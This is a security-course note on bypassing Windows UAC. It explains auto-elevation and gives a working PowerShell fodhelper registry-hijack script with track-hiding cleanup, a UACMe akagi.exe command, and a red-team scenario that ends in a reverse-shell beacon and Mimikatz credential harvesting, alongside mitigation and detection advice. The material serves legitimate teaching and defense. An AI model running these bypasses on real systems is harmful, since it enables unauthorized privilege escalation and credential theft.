---
tags: [active-directory, intermediate, privesc, vapt]
difficulty: intermediate
module: "69 - AD Access Controls and Escalation Basics"
topic: "69.11 Bypassing UAC User Account Control"
---

# 11 - Bypassing UAC User Account Control

## 1. Introduction to User Account Control (UAC)

User Account Control (UAC) is a fundamental Windows security feature introduced in Windows Vista. Its primary goal is to prevent unauthorized or malicious changes to the operating system by forcing applications and tasks to run in the security context of a non-administrator account, unless an administrator explicitly authorizes administrator-level access to the system. 

When a user logs into a Windows system as a member of the local Administrators group, Windows actually creates two access tokens for that user:
1. **A Standard User Token**: This token has administrative privileges stripped away and is used to launch the standard Windows desktop environment (explorer.exe) and most user-mode applications.
2. **An Administrator Token**: This token retains all the privileges of the local administrator and is kept in reserve.

When an application requires administrative rights (e.g., an installer, a system settings utility), UAC prompts the user for consent. If consent is given, Windows launches the application using the reserved Administrator token. This conceptual separation is crucial to understand because bypassing UAC involves tricking the system into utilizing the elevated token without presenting the user with the recognizable consent prompt.

## 2. Integrity Levels and Access Tokens

Windows Mandatory Integrity Control (MIC) is the mechanism that enforces the restrictions imposed by UAC. Every process, file, and registry key is assigned an Integrity Level (IL). The primary integrity levels are:
- **System**: Used by the NT AUTHORITY\SYSTEM account and core kernel processes.
- **High**: Used by processes running with administrative privileges (the elevated token).
- **Medium**: Used by standard users and the unelevated administrator token. Most user applications run here.
- **Low**: Used by applications that interact with the internet (e.g., web browsers, PDF readers) to restrict their ability to write to the system if compromised.
- **Untrusted**: Used for completely untrusted code, such as anonymous web access.

UAC bypasses fundamentally involve a process running at a **Medium Integrity Level** attempting to spawn a process at a **High Integrity Level** without user interaction.

## 3. Auto-Elevation: The Achilles Heel of UAC

To prevent UAC prompts from overwhelming users during routine system maintenance, Microsoft introduced the concept of **Auto-Elevation**. Certain built-in Windows executables are allowed to elevate automatically from Medium to High integrity without displaying a prompt, provided specific conditions are met:
1. **The executable must be digitally signed by Microsoft.**
2. **The executable must be located in a trusted directory**, such as `C:\Windows\System32`.
3. **The executable's manifest must specify `autoElevate` as `true`.**

Attackers exploit auto-elevating binaries by manipulating their execution environment or dependencies. Since the binary automatically runs at High Integrity, if an attacker can control what the binary executes or loads (e.g., via COM hijacking, DLL hijacking, or registry manipulation), they can execute their own malicious code at High Integrity.

## 4. Common UAC Bypass Methodologies

There are dozens of known UAC bypass techniques, many of which are documented in the **UACMe** framework. Most of these techniques fall into a few primary categories.

### 4.1. Registry Key Hijacking (Fodhelper.exe)
`fodhelper.exe` (Features on Demand Helper) is a trusted Windows binary located in `C:\Windows\System32`. It auto-elevates when executed. When `fodhelper.exe` runs, it queries the registry to determine which command to execute for specific feature management tasks. 

Specifically, it looks at:
`HKCU\Software\Classes\ms-settings\Shell\Open\command`

Because the `HKCU` (HKEY_CURRENT_USER) hive is writable by the current Medium Integrity user, an attacker can create this key and place a malicious payload in its default value. When the attacker executes `fodhelper.exe`, it auto-elevates and executes the payload located in the `HKCU` registry key as a High Integrity process.

### 4.2. Environment Variable Expansion
Certain scheduled tasks or auto-elevating binaries rely on environment variables (like `%windir%` or `%systemroot%`) to locate dependencies. If an attacker can manipulate user-level environment variables (which take precedence or can be injected into the path), they can force an elevated process to load a malicious binary from a path they control, rather than the intended system path.

### 4.3. COM Hijacking
The Component Object Model (COM) is a system for software components to communicate. Applications often request COM objects by their Class ID (CLSID). By default, the system looks in `HKCU\Software\Classes\CLSID` before looking in `HKLM\Software\Classes\CLSID`. An attacker can register a malicious DLL under a specific CLSID in the `HKCU` hive. When an auto-elevating process requests that COM object, it will load the attacker's DLL at High Integrity.

### 4.4. The SilentCleanup Scheduled Task
Windows includes a built-in scheduled task called `SilentCleanup` which runs with the highest privileges. Interestingly, any standard user can trigger this task. The task executes `cleanmgr.exe`, which uses the `%windir%` environment variable. By overriding the `%windir%` variable in the `HKCU` registry hive, an attacker can hijack the execution flow of the `SilentCleanup` task to launch an arbitrary executable.

## 5. ASCII Diagram: Fodhelper UAC Bypass Flow

```text
  Medium Integrity Context                          High Integrity Context
  +----------------------+                          +----------------------+
  |                      |                          |                      |
  | 1. Attacker writes   |                          |                      |
  |    payload path to   |                          |                      |
  |    HKCU Registry     |                          |                      |
  |    (ms-settings)     |                          |                      |
  +---------+------------+                          |                      |
            |                                       |                      |
            v                                       |                      |
  +----------------------+                          |                      |
  |                      |                          |                      |
  | 2. Attacker launches |   Auto-Elevation         |                      |
  |    fodhelper.exe     +------------------------> | 3. fodhelper.exe     |
  |                      |  (No Prompt for Admin)   |    starts at High IL |
  +----------------------+                          +----------+-----------+
                                                               |
                                                               v
                                                    +----------------------+
                                                    |                      |
                                                    | 4. fodhelper queries |
                                                    |    HKCU for command  |
                                                    |    and executes      |
                                                    |    Attacker Payload  |
                                                    +----------+-----------+
                                                               |
                                                               v
                                                    +----------------------+
                                                    |                      |
                                                    | 5. Payload executes  |
                                                    |    at High Integrity |
                                                    |    (SYSTEM / Admin)  |
                                                    +----------------------+
```

## 6. Exploitation Examples

### 6.1. Fodhelper Bypass via PowerShell
The following PowerShell snippet demonstrates how to manually abuse the `fodhelper.exe` auto-elevation mechanism.

```powershell
# Define the registry path
$RegistryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

# Define the payload (e.g., launching an elevated command prompt)
$Payload = "cmd.exe"

# Create the registry structure
New-Item -Path $RegistryPath -Force | Out-Null
New-ItemProperty -Path $RegistryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path $RegistryPath -Name "(default)" -Value $Payload -Force

# Execute the auto-elevating binary
Start-Process "C:\Windows\System32\fodhelper.exe"

# Clean up the registry to hide tracks
Start-Sleep -Seconds 3
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### 6.2. UACMe Framework
In a practical penetration testing scenario, security professionals often rely on automated frameworks like **UACMe** by hfiref0x. UACMe contains an extensive index of over 70 distinct UAC bypass methods. 

Execution is typically straightforward. The attacker uploads the compiled `akagi.exe` binary and passes the desired method index and payload:
```cmd
# Execute UACMe method 33 (fodhelper) with a custom payload
akagi.exe 33 C:\Temp\malicious_payload.exe
```

## 7. Defending and Detecting UAC Bypasses

### 7.1. Mitigation
- **Set UAC to "Always Notify"**: By far the most effective mitigation against UAC bypasses is to drag the UAC slider in Windows settings to the top level ("Always Notify"). This disables the auto-elevation mechanism entirely. Even Microsoft signed binaries will prompt for consent.
- **Principle of Least Privilege**: Users should not be local administrators. UAC is not a security boundary; it is a convenience feature. Standard users cannot bypass UAC to become administrators because they lack the reserved Administrator token.
- **LAPS**: Implementing the Local Administrator Password Solution (LAPS) ensures that local administrative accounts have randomized, highly complex passwords, mitigating lateral movement if a local bypass is achieved.

### 7.2. Detection
- **Event Logging**: Monitor Event ID 4688 (Process Creation). Look for suspicious child processes spawning from known auto-elevating binaries (e.g., `cmd.exe` or `powershell.exe` being spawned by `fodhelper.exe`, `sdclt.exe`, or `eventvwr.exe`).
- **Registry Monitoring**: Audit changes to specific HKCU registry keys, particularly:
  - `HKCU\Software\Classes\ms-settings\Shell\Open\command`
  - `HKCU\Software\Classes\mscfile\shell\open\command`
  - `HKCU\Environment\windir`
- **Integrity Level Tracking**: Use Sysmon to log process integrity levels. A transition from a Medium IL process directly interacting with or spawning a High IL process via unusual registry paths is highly anomalous.

## Real-World Attack Scenario

A red team operator compromised a developer's machine (`DEV-LT-09`) in a tech company. The developer, Alice, was a member of the local Administrators group, but UAC was enabled at its default setting. The operator's initial payload executed in a Medium Integrity context, restricting them from dumping LSASS memory or installing persistent services.

To escalate to High Integrity without triggering a UAC prompt that would alert Alice, the operator opted for the classic `fodhelper.exe` registry hijack.

**The Execution:**
1. The operator recognized that `fodhelper.exe` is a Microsoft-signed binary configured to auto-elevate. When run, it queries a specific `HKCU` registry key to determine what executable to launch for managing optional features.
2. Operating from a Medium Integrity PowerShell session, the operator created the necessary registry structure, which Alice's account had the right to modify:
   `New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force`
   `New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""`
3. The operator set the default value of the key to point to their malicious reverse shell payload:
   `Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\Public\beacon.exe"`
4. With the trap set, the operator executed the built-in Windows binary:
   `Start-Process "C:\Windows\System32\fodhelper.exe"`

**The Outcome:**
Because `fodhelper.exe` is trusted, Windows auto-elevated it to High Integrity without prompting Alice. `fodhelper.exe` then read the attacker-controlled registry key and blindly executed `beacon.exe`. The operator received a new callback running at High Integrity. They immediately used this elevated context to clean up the `HKCU` registry keys, inject their payload into a system process, and execute Mimikatz to harvest Alice's cleartext domain credentials.

## 8. Chaining Opportunities

UAC bypasses are typically chained immediately after gaining initial access to a Windows endpoint as a local administrator running in a medium-integrity context. Once elevated to High Integrity or SYSTEM, attackers will proceed to dump credentials (e.g., via Mimikatz from LSASS) or manipulate local defense mechanisms. 
- You can chain this with LAPS exploitation if you need to pull the LAPS password from memory.
- You can chain this with lateral movement techniques (like Pass-the-Hash) which require High Integrity to inject tickets or hashes.

## 9. Related Notes
- [[12 - Exploiting LAPS Local Administrator Password Solution Basics]]
- [[13 - Kerberos Constrained Delegation Basics]]
- [[14 - Kerberos Unconstrained Delegation Basics]]
- [[15 - Defending Against Basic AD Attacks]]
- [[02 - Local Privilege Escalation Techniques]]
- [[05 - Post-Exploitation Credential Dumping]]

